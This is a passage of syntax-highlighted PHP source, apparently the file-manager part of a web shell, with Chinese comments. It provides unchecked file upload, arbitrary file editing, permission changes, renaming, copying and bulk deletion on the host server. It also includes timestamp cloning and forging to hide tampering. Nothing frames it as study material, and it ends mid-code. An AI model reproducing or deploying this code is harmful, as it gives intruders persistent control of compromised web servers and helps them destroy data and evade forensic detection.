<span style="color: #6699cc;">&lt;table</span> <span style="color: #6699cc;">width=</span><span style="color: #66cccc;">"100%"</span> <span style="color: #6699cc;">border=</span><span style="color: #66cccc;">"0"</span> <span style="color: #6699cc;">cellpadding=</span><span style="color: #66cccc;">"15"</span> <span style="color: #6699cc;">cellspacing=</span><span style="color: #66cccc;">"0"</span><span style="color: #6699cc;">&gt;&lt;tr&gt;&lt;td&gt;</span>
<span style="color: #cc99cc;">&lt;?php</span>
$<span style="color: #ffcc66;">errmsg</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">m(</span>$<span style="color: #ffcc66;">errmsg</span>);

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#36335;&#24452;</span>
<span style="color: #99cc99;">if</span> (!$<span style="color: #ffcc66;">dir</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dir</span> = $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">"DOCUMENT_ROOT"</span>] ? $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">"DOCUMENT_ROOT"</span>] : <span style="color: #66cccc;">'.'</span>;
}
$<span style="color: #ffcc66;">nowpath</span> = <span style="color: #cccccc; background-color: #2d2d2d;">getPath(</span><span style="color: #f2777a; font-weight: bold;">SA_ROOT</span>, $<span style="color: #ffcc66;">dir</span>);
<span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">substr(</span>$<span style="color: #ffcc66;">dir</span>, -<span style="color: #cccccc; background-color: #2d2d2d;">1</span>) != <span style="color: #66cccc;">'/'</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dir</span> = $<span style="color: #ffcc66;">dir</span>.<span style="color: #66cccc;">'/'</span>;
}

<span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'file'</span>) {

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#21028;&#26029;&#35835;&#20889;&#24773;&#20917;</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dir_writeable</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">is_writable(</span>$<span style="color: #ffcc66;">nowpath</span>) ? <span style="color: #66cccc;">'Writable'</span> : <span style="color: #66cccc;">'Non-writable'</span>;

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#21019;&#24314;&#30446;&#24405;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">newdirname</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mkdirs</span> = $<span style="color: #ffcc66;">nowpath</span><span style="color: #f2777a; font-weight: bold;">.</span>$<span style="color: #ffcc66;">newdirname</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">mkdirs</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Directory has already existed'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Directory created '</span>.(@<span style="color: #cccccc; background-color: #2d2d2d;">mkdir(</span>$<span style="color: #ffcc66;">mkdirs</span>,<span style="color: #cccccc; background-color: #2d2d2d;">0777</span>) ? <span style="color: #66cccc;">'success'</span> : <span style="color: #66cccc;">'failed'</span>)<span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">chmod(</span>$<span style="color: #ffcc66;">mkdirs</span>,<span style="color: #cccccc; background-color: #2d2d2d;">0777</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#19978;&#20256;&#25991;&#20214;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">doupfile</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'File upload '</span>.(@<span style="color: #cccccc; background-color: #2d2d2d;">copy(</span>$<span style="color: #6699cc;">_FILES</span>[<span style="color: #66cccc;">'uploadfile'</span>][<span style="color: #66cccc;">'tmp_name'</span>],$<span style="color: #ffcc66;">uploaddir</span>.<span style="color: #66cccc;">'/'</span><span style="text-decoration: underline;">.$</span><span style="color: #6699cc; text-decoration: underline;">_FILES</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'uploadfile'</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">]) ? </span><span style="color: #66cccc; text-decoration: underline;">'success'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#32534;&#36753;&#25991;&#20214;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">editfilename</span> &amp;&amp; $<span style="color: #ffcc66;">filecontent</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fp</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">fopen(</span>$<span style="color: #ffcc66;">editfilename</span>,<span style="color: #66cccc;">'w'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Save file '</span>.(@<span style="color: #cccccc; background-color: #2d2d2d;">fwrite(</span>$<span style="color: #ffcc66;">fp</span>,$<span style="color: #ffcc66;">filecontent</span>) ? <span style="color: #66cccc;">'success'</span> : <span style="color: #66cccc;">'failed'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">fp</span>);
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#32534;&#36753;&#25991;&#20214;&#23646;&#24615;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">pfile</span> &amp;&amp; $<span style="color: #ffcc66;">newperm</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">pfile</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'The original file does not exist'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">newperm</span> = <span style="color: #cccccc; background-color: #2d2d2d;">base_convert(</span>$<span style="color: #ffcc66;">newperm</span>,<span style="color: #cccccc; background-color: #2d2d2d;">8</span>,<span style="color: #cccccc; background-color: #2d2d2d;">10</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Modify file attributes '</span>.(@<span style="color: #cccccc; background-color: #2d2d2d;">chmod(</span>$<span style="color: #ffcc66;">pfile</span>,$<span style="color: #ffcc66;">newperm</span>) ? <span style="color: #66cccc;">'success'</span> : <span style="color: #66cccc;">'</span><span style="color: #66cccc; text-decoration: underline;">failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#25913;&#21517;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">oldname</span> &amp;&amp; $<span style="color: #ffcc66;">newfilename</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">nname</span> = $<span style="color: #ffcc66;">nowpath</span><span style="color: #f2777a; font-weight: bold;">.</span>$<span style="color: #ffcc66;">newfilename</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">nname</span>) || !<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">oldname</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span>$<span style="color: #ffcc66;">nname</span>.<span style="color: #66cccc;">' has already existed or original file does not exist'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(basename(</span>$<span style="color: #ffcc66;">oldname</span>).<span style="color: #66cccc;">' renamed '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">basename(</span>$<span style="color: #ffcc66;">nname</span>).(@<span style="color: #cccccc; background-color: #2d2d2d;">rename(</span>$<span style="color: #ffcc66;">oldname</span>,<span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">nname</span><span style="text-decoration: underline;">) ? </span><span style="color: #66cccc; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#22797;&#21046;&#25991;&#20214;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">sname</span> &amp;&amp; $<span style="color: #ffcc66;">tofile</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">tofile</span>) || !<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">sname</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'The goal file has already existed or original file does not exist</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(basename(</span>$<span style="color: #ffcc66;">tofile</span>).<span style="color: #66cccc;">' copied '</span>.(@<span style="color: #cccccc; background-color: #2d2d2d;">copy(</span>$<span style="color: #ffcc66;">sname</span>,$<span style="color: #ffcc66;">tofile</span>) ? <span style="color: #cccccc; background-color: #2d2d2d;">basename(</span>$<span style="color: #ffcc66;">to</span><span style="color: #ffcc66; text-decoration: underline;">file</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#20811;&#38534;&#26102;&#38388;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">curfile</span> &amp;&amp; $<span style="color: #ffcc66;">tarfile</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!@<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">curfile</span>) || !@<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">tarfile</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'The goal file has already existed or original file does not exist</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">time</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">filemtime(</span>$<span style="color: #ffcc66;">tarfile</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Modify file the last modified '</span>.(@<span style="color: #cccccc; background-color: #2d2d2d;">touch(</span>$<span style="color: #ffcc66;">curfile</span>,$<span style="color: #ffcc66;">time</span>,$<span style="color: #ffcc66;">time</span>) ? <span style="color: #66cccc;">'</span><span style="color: #66cccc; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#33258;&#23450;&#20041;&#26102;&#38388;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">curfile</span> &amp;&amp; $<span style="color: #ffcc66;">year</span> &amp;&amp; $<span style="color: #ffcc66;">month</span> &amp;&amp; $<span style="color: #ffcc66;">day</span> &amp;&amp; $<span style="color: #ffcc66;">hour</span> &amp;&amp; $<span style="color: #ffcc66;">minute</span> &amp;&amp; $<span style="color: #ffcc66;">second</span>) <span style="text-decoration: underline;">{</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!@<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">curfile</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(basename(</span>$<span style="color: #ffcc66;">curfile</span>).<span style="color: #66cccc;">' does not exist'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">time</span> = <span style="color: #cccccc; background-color: #2d2d2d;">strtotime(</span><span style="color: #66cccc;">"$year-$month-$day $hour:$minute:$second"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Modify file the last modified '</span>.(@<span style="color: #cccccc; background-color: #2d2d2d;">touch(</span>$<span style="color: #ffcc66;">curfile</span>,$<span style="color: #ffcc66;">time</span>,$<span style="color: #ffcc66;">time</span>) ? <span style="color: #66cccc;">'</span><span style="color: #66cccc; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#25209;&#37327;&#21024;&#38500;&#25991;&#20214;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span>($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'delfiles'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">dl</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dfiles</span>=<span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">succ</span> = $<span style="color: #ffcc66;">fail</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">dl</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">filepath</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">is_dir(</span>$<span style="color: #ffcc66;">filepath</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (@<span style="color: #cccccc; background-color: #2d2d2d;">deltree(</span>$<span style="color: #ffcc66;">filepath</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">succ</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fail</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (@<span style="color: #cccccc; background-color: #2d2d2d;">unlink(</span>$<span style="color: #ffcc66;">filepath</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">succ</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fail</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Deleted folder/file have finished,choose '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">count(</span>$<span style="color: #ffcc66;">dl</span>).<span style="color: #66cccc;">' success '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">succ</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">' fail '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">fail</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Please select folder/file(s)'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#25805;&#20316;&#23436;&#27605;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=<span style="color: #6699cc;">&gt;</span><span style="color: #66cccc;">'createdir'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'newdirname'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>,$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'fileperm'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'newperm'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'pfile'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>,$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'copyfile'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'sname'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'tofile'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>,$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'rename'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'oldname'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'newfilename'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>,$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'fileopform'</span>, <span style="color: #66cccc;">'target'</span>=&gt;<span style="color: #66cccc;">'_blank'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'opfile'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'getsize'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'getdir'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);

<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">free</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">disk_free_space(</span>$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">free</span> &amp;&amp; $<span style="color: #ffcc66;">free</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">all</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">disk_total_space(</span>$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">all</span> &amp;&amp; $<span style="color: #ffcc66;">all</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">used</span> = $<span style="color: #ffcc66;">all</span>-$<span style="color: #ffcc66;">free</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;File Manager - Current disk free '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">sizecount(</span>$<span style="color: #ffcc66;">free</span>).<span style="color: #66cccc;">' of '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">sizecount(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">all</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">' ('</span><span style="text-decoration: underline;">.@</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">round(100</span><span style="text-decoration: underline;">/($</span><span style="color: #ffcc66; text-decoration: underline;">all</span><span style="text-decoration: underline;">/$</span><span style="color: #ffcc66; text-decoration: underline;">free</span><span style="text-decoration: underline;">),</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">2</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">'%)&lt;/h2&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">cwd_links</span> = <span style="color: #66cccc;">''</span>;
